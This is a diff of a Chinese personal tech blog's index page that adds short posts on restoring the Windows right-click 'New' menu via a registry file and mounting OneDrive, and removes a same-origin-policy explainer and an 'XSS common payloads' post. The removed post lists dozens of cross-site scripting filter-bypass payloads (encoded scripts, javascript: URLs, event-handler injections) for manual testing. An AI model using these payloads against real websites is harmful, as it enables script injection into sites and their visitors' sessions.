@@ -115,7 +115,7 @@
         
             <li><a href="%E6%B5%8F%E8%A7%88%E5%99%A8.html">浏览器</a></li>
         
-            <li><a href="%E5%A5%87%E6%B7%AB%E5%B7%A7%E6%8A%80.html">奇淫巧技</a></li>
+            <li><a href="%E6%9C%AA%E5%88%86%E7%B1%BB.html">未分类</a></li>
          
 
       </ul>
@@ -137,6 +137,85 @@
 	<div class="large-8 medium-8 columns">
 		<div class="markdown-body home-categories">
 		
+			<div class="article">
+                <a class="clearlink" href="15446969783198.html">
+                
+                  <h1>解决windows右键新建消失问题</h1>
+                  <div class="a-content">
+                      
+                      <div class="a-content-text">
+                        
+                        	<p>新建一个文件后缀名写为reg（注册表文件格式）的文件。<br/>
+然后用记事本或文本编辑器打开，写入文件内容：</p>
+
+<pre class="line-numbers"><code class="language-text">Windows Registry Editor Version 5.00
+
+[HKEY_CLASSES_ROOT\Directory\Background\shellex\ContextMenuHandlers\New]
+
+@=&quot;{D969A300-E7FF-11d0-A93B-00A0C90F2719}&quot;
+</code></pre>
+
+<p>保存，然后双击该文件，即可。</p>
+
+                        
+                      </div>
+                  </div>
+                </a>
+                <div class="read-more clearfix">
+                  <div class="more-left left">
+                  
+                    <span class="date">2018/12/13 18:29 下午</span>
+                    <span>posted in&nbsp;</span> 
+          				  
+          					    <span class="posted-in"><a href='Windows.html'>Windows</a></span>
+          				   
+                  </div>
+                  <div class="more-right right">
+                  <span class="comments">
+                      
+
+                       
+                  </span>
+                  </div>
+                </div>
+              </div><!-- article -->
+        
+			<div class="article">
+                <a class="clearlink" href="15446968262703.html">
+                
+                  <h1>OneDrive映射到本地（像访问本地磁盘一样访问网盘）</h1>
+                  <div class="a-content">
+                      
+                      <div class="a-content-text">
+                        
+                        	<p>参考以下链接即可：<br/>
+<a href="http://baijiahao.baidu.com/s?id=1549908946659905&amp;wfr=spider&amp;for=pc">http://baijiahao.baidu.com/s?id=1549908946659905&amp;wfr=spider&amp;for=pc</a></p>
+
+<p>举一反三，webdav、nfs、samba等都可以使用这种方式挂载，来方便访问。</p>
+
+                        
+                      </div>
+                  </div>
+                </a>
+                <div class="read-more clearfix">
+                  <div class="more-left left">
+                  
+                    <span class="date">2018/12/13 18:27 下午</span>
+                    <span>posted in&nbsp;</span> 
+          				  
+          					    <span class="posted-in"><a href='Windows.html'>Windows</a></span>
+          				   
+                  </div>
+                  <div class="more-right right">
+                  <span class="comments">
+                      
+
+                       
+                  </span>
+                  </div>
+                </div>
+              </div><!-- article -->
+        
 			<div class="article">
                 <a class="clearlink" href="15446897185202.html">
                 
@@ -288,198 +367,6 @@ http://localhost/DVWA-master/login.php<br/><br/>
                 </div>
               </div><!-- article -->
         
-			<div class="article">
-                <a class="clearlink" href="15446893463166.html">
-                
-                  <h1>xss常用payload</h1>
-                  <div class="a-content">
-                      
-                      <div class="a-content-text">
-                        
-                        	<blockquote>
-<p>这是很久之前写的东西了，忘记是从哪里收集总结来的了。抱歉没法贴源地址了。</p>
-</blockquote>
-
-<p>在平时的工作中，经常遇到需要手工测试xss漏洞的地方，每次都将代码输入一遍（特别是用手机的时候）会显得比较麻烦，因此写这篇文档来记录一下平时可能用到的xss攻击代码，以备不时之需，复制粘贴总比打字方便一些。以下部分代码收集自网络（全部测试过，可以直接使用）。</p>
-
-<p>xss漏洞是常见的web安全问题之一，当网站未做任何防御时，输入<script>alert(‘xss’)</script>就会弹出上述弹窗。但是通常情况下，网站都会对一些字符进行过滤，以预防xss攻击，这时就需要运用到一些xss绕过技巧。</p>
-
-<p>1.大小写混合绕过<br/>
-顾名思义，通过修改攻击代码大小写进行绕过。虽然javascript对大小写敏感但是html不敏感，javascript操作html的标签不敏感。代码示例：<code>&lt;sCrIpt&gt;alErt(‘xss’)&lt;/ScRiPT&gt;</code></p>
-
-<p>2.闭合标签绕过</p>
-
-<p>单引号很多时候都能起到闭合语句的作用，有时候我们通过关闭标签可以使xss生效。</p>
-
-<p>3.HEX编码来绕过</p>
-
-<p>对语句进行Hex编码，如<code>&lt;script&gt;alert(“xss”);&lt;/script&gt;</code>可以转换为<code>3c7363726970743e616c65727428e2809c787373e2809d293b3c2f7363726970743e</code></p>
-
-<p>4.Javascript URL</p>
-
-<p>链接标签里可以通过在 URL 中使用 javascript:… 来执行 JavaScript：</p>
-
-<p><code>&lt;a href=”javascript:alert(‘test’)”&gt;link&lt;/a&gt;</code></p>
-
-<p>稍微高级一点的写法还有：<code>&lt;a href=”javascript:alert(‘xss’)”&gt;link&lt;/a&gt;</code>，通过url编码使它依旧可以被浏览器执行但又不匹配正则表达式。</p>
-
-<p>5.根据之前绕过方法的启发，我们可以通过修改标签和编码或者函数来修改所用的攻击代码</p>
-
-<p>===&gt;常用代码如下：</p>
-
-<p><code>&lt;script&gt;alert(8888)&lt;/script&gt;</code></p>
-
-<p><code>&lt;img src=1 onerror=alert(1)&gt;</code></p>
-
-<p><code>&lt;script&gt;confirm(8888)&lt;/script&gt;</code></p>
-
-<p><code>&lt;script&gt;prompt(8888)&lt;/script&gt;</code></p>
-
-<p><code>&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(8888)&lt;/script&gt;</code></p>
-
-<p><code>&lt;script src=data:text/javascript,alert(8888)&gt;&lt;/script&gt;</code></p>
-
-<p><code>&lt;script src=&amp;#100&amp;#97&amp;#116&amp;#97:text/javascript,alert(8888)&gt;&lt;/script&gt;</code></p>
-
-<p><code>&lt;script&gt;alert(String.fromCharCode(49,49))&lt;/script&gt;</code></p>
-
-<p><code>&lt;script&gt;alert(/8888/.source)&lt;/script&gt;</code></p>
-
-<p><code>&lt;script&gt;setTimeout(alert(8888),0)&lt;/script&gt;</code></p>
-
-<p>===&gt;以下为触发xss，即鼠标移动到输出的字符上（或点击字符）时，即会引发xss。</p>
-
-<p><code>&lt;anytag onmouseover=alert(1)&gt;h</code></p>
-
-<p><code>&lt;anytag onclick=alert(2)&gt;h</code></p>
-
-<p><code>&lt;a onmouseover=alert(3)&gt;h</code></p>
-
-<p><code>&lt;a onclick=alert(4)&gt;h</code></p>
-
-<p><code>&lt;a href=javascript:alert(5)&gt;h</code></p>
-
-<p><code>&lt;button/onclick=alert(6)&gt;h</code></p>
-
-<p><code>formaction=javascript&amp;colon;alert(7)&gt;h</code></p>
-
-<p><code>&lt;form/action=javascript:alert(8)&gt;&lt;input/type=submit&gt;</code></p>
-
-<p><code>&lt;form onsubmit=alert(9)&gt;&lt;button&gt;h</code></p>
-
-<p><code>&lt;form onsubmit=alert(10)&gt;&lt;button&gt;h</code></p>
-
-<p><code>&lt;img src=x onerror=alert(11)&gt; 29</code></p>
-
-<p><code>&lt;body/onload=alert(12)&gt;</code></p>
-
-<p><code>&lt;body onscroll=alert(13)&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;</code></p>
-
-<p><code>&lt;iframe/onload=alert(document.domain)&gt;&lt;/iframe&gt;</code></p>
-
-<p><code>&lt;IFRAME SRC=”javascript:alert(14);”&gt;&lt;/IFRAME&gt;</code></p>
-
-<p><code>&lt;meta http-equiv=”refresh” content=”0;</code></p>
-
-<p><code>url=data:text/html,&lt;script&gt;alert(15)&lt;/script&gt;”&gt;</code></p>
-
-<p><code>&lt;object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&gt;&lt;/object&gt;</code>　　　　＃此为base64编码，有兴趣可以试试其他编码方式</p>
-
-<p><code>&lt;input onfocus=alert(16) autofocus&gt;</code>　　　　＃使用这行攻击代码会无限弹xss</p>
-
-<p><code>&lt;input onblur=alert(17) autofocus&gt;&lt;input autofocus&gt;</code></p>
-
-                        
-                      </div>
-                  </div>
-                </a>
-                <div class="read-more clearfix">
-                  <div class="more-left left">
-                  
-                    <span class="date">2018/12/13 16:22 下午</span>
-                    <span>posted in&nbsp;</span> 
-          				  
-          					    <span class="posted-in"><a href='xss%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC.html'>xss跨站脚本</a></span>
-          				   
-                  </div>
-                  <div class="more-right right">
-                  <span class="comments">
-                      
-
-                       
-                  </span>
-                  </div>
-                </div>
-              </div><!-- article -->
-        
-			<div class="article">
-                <a class="clearlink" href="15446892905759.html">
-                
-                  <h1>同源策略</h1>
-                  <div class="a-content">
-                      
-                      <div class="a-content-text">
-                        
-                        	<blockquote>
-<p>摘自网络，出处忘了。</p>
-</blockquote>
-
-<p>同源策略（SOP，Same Origin Policy），两个页面的【协议】【域名】【端口】都相同，则两个页面具有相同的源，任何一个不同都是不同源的。<br/>
-举例：<br/>
-假设源是：<code>http://store.company.com/dir/page.html</code><br/>
-同源的是：<br/>
-<code>http://store.company.com/dir2/other.html</code><br/>
-<code>http://store.company.com/dir/inner/another.html</code><br/>
-不同源的是：<br/>
-<code>https://store.company.com/secure.html</code> 不同协议 ( https和http )<br/>
-<code>http://store.company.com:81/dir/etc.html</code> 不同端口 ( 81和80)<br/>
-<code>http://news.company.com/dir/other.html</code> 不同域名 ( news和store )</p>
-
-<h2 id="toc_0">同源策略控制内容</h2>
-
-<p><em>同源策略是禁止读取HTTP回复，并不会禁止脚本执行，也不会禁止HTTP请求，因此在防御CSRF上作用是非常有限的，因为CSRF在请求发出的时候就已经达到了攻击的目的。</em><br/>
-一般情况下，静态资源通常不受同源策略限制，如有js/css/jpg/png等。</p>
-
-<p>同源策略控制了不同源之间的交互，例如在使用<code>XMLHttpRequest</code>或<code>img</code>标签时则会受到同源策略的约束，这些交互通常分为三类。</p>
-
-<ul>
-<li>通常允许跨域写（Cross-origin writes），例如链接（links），重定向以及表单提交。少数特定的HTTP请求需要添加&quot;预检请求&quot;<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#Preflighted_requests">preflight</a>如OPTIONS来查询可用的方法。</li>
-<li>通常允许跨域资源嵌入（Cross-origin embedding）</li>
-<li>通常 <strong>不允许</strong> 跨域读（Cross-origin reads），但常可以通过内嵌资源来巧妙的进行读取访问。例如可以读取嵌入图片的高度和宽度，调用内嵌脚本的方法，或<a href="https://www.grepular.com/Abusing_HTTP_Status_Codes_to_Expose_Private_Information">availability of an embedded resource</a></li>
-</ul>
-
-<p>下面是可能嵌入跨域资源的示例：<br/>
-<code>&lt;script src=&quot;...&quot;&gt;&lt;/script&gt;</code> 标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到。<br/>
-<code>&lt;link rel=&quot;stylesheet&quot; href=&quot;...&quot;&gt;</code> 标签嵌入CSS。由于CSS的<a href="http://scarybeastsecurity.blogspot.dk/2009/12/generic-cross-browser-cross-domain.html">松散的语法规则</a>，CSS的跨域需要一个设置正确的Content-Type 消息头。不同浏览器有不同的限制： <a href="https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/compatibility/gg622939(v=vs.85)">IE</a>, <a href="https://www.mozilla.org/en-US/security/advisories/mfsa2010-46/">Firefox</a>, <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=9877">Chrome</a>, <a href="https://support.apple.com/zh-cn/HT4070">Safari</a> (跳至CVE-2010-0051)部分 和 <a href="https://security.opera.com/">Opera</a>。<br/>
-<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/img"><code>&lt;img&gt;</code></a>嵌入图片。支持的图片格式包括PNG,JPEG,GIF,BMP,SVG,...<br/>
-<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/video"><code>&lt;video&gt;</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/audio"><code>&lt;audio&gt;</code></a>嵌入多媒体资源。<br/>
-<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/object"><code>&lt;object&gt;</code></a>, <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/embed"><code>&lt;embed&gt;</code></a> 和 <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/applet"><code>&lt;applet&gt;</code></a> 的插件。<br/>
-<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/@font-face">@font-face</a> 引入的字体。一些浏览器允许跨域字体（ cross-origin fonts），一些需要同源字体（same-origin fonts）。<br/>
-<a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/frame"><code>&lt;frame&gt;</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/iframe"><code>&lt;iframe&gt;</code></a> 载入的任何资源。站点可以使用X-Frame-Options消息头来阻止这种形式的跨域交互。</p>
-
-                        
-                      </div>
-                  </div>
-                </a>
-                <div class="read-more clearfix">
-                  <div class="more-left left">
-                  
-                    <span class="date">2018/12/13 16:21 下午</span>
-                    <span>posted in&nbsp;</span> 
-          				  
-          					    <span class="posted-in"><a href='xss%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC.html'>xss跨站脚本</a></span>
-          				   
-                  </div>
-                  <div class="more-right right">
-                  <span class="comments">
-                      
-
-                       
-                  </span>
-                  </div>
-                </div>
-              </div><!-- article -->
-        
               
 
 
@@ -551,7 +438,7 @@ http://localhost/DVWA-master/login.php<br/><br/>
         
             <a href="%E6%B5%8F%E8%A7%88%E5%99%A8.html"><strong>浏览器</strong></a>
         
-            <a href="%E5%A5%87%E6%B7%AB%E5%B7%A7%E6%8A%80.html"><strong>奇淫巧技</strong></a>
+            <a href="%E6%9C%AA%E5%88%86%E7%B1%BB.html"><strong>未分类</strong></a>
          
         </p>
 
@@ -568,6 +455,18 @@ http://localhost/DVWA-master/login.php<br/><br/>
 	      
 		      
 			      <li class="post">
+			        <a href="15473910152747.html">给网站嵌入百度搜索框</a>
+			      </li>
+		     
+		  
+		      
+			      <li class="post">
+			        <a href="15473903423452.html">vscode 快速生成 html 代码</a>
+			      </li>
+		     
+		  
+		      
+			      <li class="post">
 			        <a href="15473524859484.html">msf更新</a>
 			      </li>
 		     
@@ -581,18 +480,6 @@ http://localhost/DVWA-master/login.php<br/><br/>
 		      
 			      <li class="post">
 			        <a href="15470313638273.html">修改Mac主机名、计算机名</a>
-			      </li>
-		     
-		  
-		      
-			      <li class="post">
-			        <a href="15468702076334.html">使用python快速搭建ftp服务器</a>
-			      </li>
-		     
-		  
-		      
-			      <li class="post">
-			        <a href="15457897865747.html">将网页保存为PDF</a>
 			      </li>
 		     
 		  
